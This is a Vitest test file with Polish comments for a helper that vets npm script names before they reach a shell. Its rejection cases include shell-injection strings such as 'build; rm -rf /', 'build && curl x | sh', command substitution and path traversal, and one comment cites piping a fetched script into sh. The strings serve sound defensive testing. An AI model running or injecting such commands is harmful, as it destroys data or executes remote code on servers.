import { describe, it, expect } from 'vitest';
import { isSafeScriptName, readPackageScripts, resolveNpmRun } from './npmScripts';

describe('isSafeScriptName', () => {
  it('przyjmuje nazwy, jakich npm faktycznie używa', () => {
    for (const name of ['build', 'test:watch', 'dev-server', 'build.prod', 'lint_all', 'a1']) {
      expect(isSafeScriptName(name), name).toBe(true);
    }
  });

  it('odrzuca wszystko, co niesie znaczenie dla powłoki', () => {
    // `spawn('npm', args, { shell: true })` skleja argumenty w wiersz polecenia,
    // więc nazwa skryptu jest wykonywana przez powłokę. To nie jest teoretyczne:
    // `build; curl zly.sh | sh` uruchomiłoby się na serwerze.
    for (const name of [
      'build; rm -rf /', 'build && curl x | sh', 'a`whoami`', 'a$(id)', 'a|b',
      'a>plik', 'a\nb', 'a b', "a'b", 'a"b', '../../etc', '-rf',
    ]) {
      expect(isSafeScriptName(name), name).toBe(false);
    }
  });

  it('odrzuca pustą nazwę i przesadnie długą', () => {
    expect(isSafeScriptName('')).toBe(false);
    expect(isSafeScriptName('a'.repeat(200))).toBe(false);
  });
});

describe('readPackageScripts', () => {
  it('wyciąga skrypty z package.json', () => {
    const scripts = readPackageScripts('{"scripts":{"build":"tsc","test":"vitest"}}');
    expect(scripts).toEqual({ build: 'tsc', test: 'vitest' });
  });

  it('brak sekcji scripts to pusty zestaw, nie błąd', () => {
    expect(readPackageScripts('{"name":"x"}')).toEqual({});
  });

  it('uszkodzony JSON daje null — to co innego niż „brak skryptów"', () => {
    // Rozróżnienie jest potrzebne: pusty zestaw znaczy „projekt bez skryptów",
    // a `null` — „nie umiem tego pliku przeczytać" i użytkownik ma się o tym
    // dowiedzieć.
    expect(readPackageScripts('{ to nie jest json')).toBeNull();
  });

  it('wartości nie będące napisami są odsiewane', () => {
    expect(readPackageScripts('{"scripts":{"ok":"tsc","zly":42}}')).toEqual({ ok: 'tsc' });
  });
});

describe('resolveNpmRun', () => {
  const scripts = { build: 'tsc', 'test:watch': 'vitest' };

  it('instalacja nie wymaga wpisu w scripts', () => {
    expect(resolveNpmRun('install', scripts)).toEqual({ ok: true, args: ['install', '--include=dev'] });
  });

  it('skrypt z package.json przechodzi', () => {
    expect(resolveNpmRun('test:watch', scripts)).toEqual({ ok: true, args: ['run', 'test:watch'] });
  });

  it('skrypt spoza package.json jest odrzucany **z nazwaniem dostępnych**', () => {
    // Sama odmowa zostawia pytanie „to co mam wpisać?" — a odpowiedź serwer ma.
    const result = resolveNpmRun('deploy', scripts);
    expect(result.ok).toBe(false);
    expect(result.ok === false && result.reason).toMatch(/build/);
    expect(result.ok === false && result.reason).toMatch(/test:watch/);
  });

  it('nazwa niebezpieczna odpada, zanim ktokolwiek zajrzy do package.json', () => {
    // Kolejność ma znaczenie: gdyby najpierw sprawdzać obecność w `scripts`,
    // wystarczyłoby wpisać złośliwą nazwę **do** package.json, żeby ją wykonać.
    const result = resolveNpmRun('build; id', { 'build; id': 'echo' });
    expect(result.ok).toBe(false);
    expect(result.ok === false && result.reason).toMatch(/niedozwolon|nazw/i);
  });

  it('nieczytelny package.json nie przepuszcza niczego poza instalacją', () => {
    expect(resolveNpmRun('install', null).ok).toBe(true);
    expect(resolveNpmRun('build', null).ok).toBe(false);
  });
});
